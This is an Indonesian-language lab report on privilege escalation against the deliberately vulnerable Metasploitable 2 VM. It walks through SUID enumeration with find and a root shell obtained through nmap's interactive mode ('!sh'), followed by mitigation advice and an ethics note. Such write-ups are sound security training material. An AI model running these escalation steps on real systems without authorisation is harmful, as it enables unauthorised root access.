# Laporan Praktik: Privilege Escalation via SUID Misconfiguration pada Metasploitable 2

**Tujuan:** Latihan keamanan siber (penetration testing) di lingkungan lab terisolasi, fokus pada teknik **privilege escalation** — eskalasi dari akses user biasa menuju root tanpa mengandalkan exploit siap pakai (seperti backdoor), melainkan lewat misconfiguration sistem.

**Lingkungan lab:**
- Target: Metasploitable 2 (`192.168.56.101`) — VM sengaja dibuat rentan untuk latihan
- Attacker: Arch Linux (`192.168.56.1`)
- Jaringan: Host-only, terisolasi dari internet dan LAN nyata
- Akses awal: SSH dengan kredensial `user`/`user` (hasil password cracking pada laporan sebelumnya)

> ⚠️ Semua teknik di laporan ini hanya sah dipakai pada sistem milik sendiri atau dengan izin eksplisit. Metasploitable sengaja dibuat rentan untuk tujuan edukasi.

---

## Konteks

Laporan sebelumnya (*Simulasi Hacking pada Metasploitable 2*) mendokumentasikan jalur serangan yang langsung berakhir di akses root — baik lewat backdoor vsftpd maupun kredensial hasil crack. Laporan ini melengkapi gap tersebut dengan skenario yang lebih representatif terhadap pentest dunia nyata: **masuk sebagai user biasa, lalu eskalasi privilege secara manual** melalui enumerasi sistem.

---

## Ringkasan Alur

```
1. Akses awal sebagai user non-root (SSH)
        ↓
2. Enumerasi: sudo rights → tertutup
        ↓
3. Enumerasi: SUID/SGID binary
        ↓
4. Identifikasi anomali: /usr/bin/nmap ber-SUID root
        ↓
5. Eksploitasi mode interaktif nmap → shell root
```

---

## Tahap 1 — Akses Awal (SSH)

Koneksi awal sempat gagal karena SSH client modern menolak algoritma host key lama (`ssh-rsa`) yang masih dipakai OpenSSH versi lawas di Metasploitable2:

```
Unable to negotiate with 192.168.56.101 port 22: no matching host key type found.
Their offer: ssh-rsa,ssh-dss
```

Solusi — paksa client menerima algoritma lama tersebut:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@192.168.56.101
```

Login berhasil dengan kredensial `user`/`user` (hasil password cracking John the Ripper pada laporan sebelumnya).

---

## Tahap 2 — Enumerasi Hak Akses Sudo

```bash
sudo -l
```

**Hasil:**
```
Sorry, user user may not run sudo on metasploitable.
```

User `user` tidak terdaftar di `/etc/sudoers` sama sekali — jalur eskalasi lewat sudo **tertutup**. Lanjut ke teknik enumerasi lain.

---

## Tahap 3 — Enumerasi SUID Binary

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Hasil (ringkas):**
```
/bin/su
/bin/mount
/bin/ping
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/nmap          ← anomali
/usr/sbin/uuidd
/usr/sbin/pppd
...
```

Sebagian besar binary di atas memang standar ber-SUID (butuh privilege tinggi untuk fungsi dasarnya: `su`, `passwd`, `mount`). Namun **`/usr/bin/nmap`** adalah anomali — nmap tidak memerlukan SUID untuk fungsi normalnya (network scanning), sehingga ini adalah indikasi **misconfiguration permission**, bukan desain sistem yang wajar.

---

## Tahap 4 — Eksploitasi SUID Nmap

### Latar belakang kerentanan

Versi Nmap lama (sebelum 5.21) memiliki **mode interaktif** yang memungkinkan eksekusi perintah shell dari dalam prompt-nya. Jika binary nmap di-set SUID root, shell yang dijalankan dari mode ini ikut mewarisi privilege root — berbeda dari backdoor vsftpd yang disusupi sengaja, ini murni kesalahan konfigurasi permission oleh administrator sistem.

### Eksekusi

```bash
nmap --interactive
```

Di dalam prompt `nmap>`:
```
!sh
```

### Verifikasi akses

```bash
whoami
```

**Hasil:**
```
root
```

Eskalasi berhasil — dari user biasa menuju akses root penuh.

---

## Analisis Teknis

| Aspek | Detail |
|---|---|
| Root cause | SUID bit tidak semestinya pada binary yang tidak butuh elevated privilege |
| Teknik | Local privilege escalation lewat fitur interactive mode aplikasi |
| Berbeda dari Tahap 3 laporan sebelumnya | vsftpd backdoor = supply chain attack (kode sengaja disusupi); ini = misconfiguration permission (kesalahan admin) |
| Alat bantu | `find`, GTFOBins (referensi payload per-binary) |

Pola serangan ini sangat umum muncul dalam sertifikasi praktik seperti OSCP dan pentest dunia nyata, karena tidak semua target memiliki exploit "siap pakai" seperti backdoor — pola yang jauh lebih sering ditemui adalah kombinasi kecil kesalahan konfigurasi (SUID, sudoers, cron, service permission) yang baru terlihat lewat enumerasi manual.

---

## Temuan & Pelajaran Keamanan

1. **SUID bit harus diaudit berkala** — binary non-esensial (tools analisis, utilitas umum) tidak boleh memiliki SUID bit. Audit rutin dengan `find / -perm -4000` seharusnya jadi bagian dari hardening checklist.
2. **Prinsip least privilege** — setiap binary hanya boleh berjalan dengan privilege minimum yang dibutuhkan fungsinya; nmap cukup berjalan sebagai user biasa.
3. **Enumerasi manual tetap relevan** — berbeda dari eksploitasi otomatis (Metasploit module), privilege escalation sering membutuhkan observasi manual terhadap konfigurasi sistem (sudo, SUID, cron, writable file).
4. **GTFOBins sebagai referensi standar** — basis data ini mendokumentasikan binary umum yang bisa disalahgunakan untuk bypass local security restriction ketika memiliki SUID atau sudo access.

---

## Mitigasi

```bash
# Cabut SUID bit dari binary yang tidak membutuhkannya
chmod u-s /usr/bin/nmap
```

Prinsip umum: SUID bit hanya untuk binary yang benar-benar butuh elevated privilege demi fungsi dasarnya (`passwd`, `su`, `mount`) — bukan tools analisis atau utilitas umum seperti nmap, tcpdump, vim, dan sejenisnya.

---

## Lampiran: Troubleshooting yang Dihadapi

| Masalah | Penyebab | Solusi |
|---|---|---|
| `no matching host key type found` | SSH client modern deprecate `ssh-rsa`/`ssh-dss` | `ssh -o HostKeyAlgorithms=+ssh-rsa user@target` |
| `Bad key types '+ssh-rsa,ssh-dss'` | Format penggabungan opsi `-o` salah (kurang spasi setelah `-o`) | Pisahkan opsi dengan `-o` + spasi di tiap flag |
| `Sorry, user user may not run sudo` | User tidak terdaftar di `/etc/sudoers` | Lanjut ke enumerasi SUID/SGID sebagai jalur alternatif |

---

## Catatan Etika

Seluruh praktik ini dilakukan pada VM lab pribadi yang terisolasi (host-only network), bukan sistem produksi atau milik pihak lain. Teknik enumerasi dan eksploitasi SUID misconfiguration tanpa izin eksplisit terhadap sistem pihak lain adalah tindak pidana di hampir semua yurisdiksi.
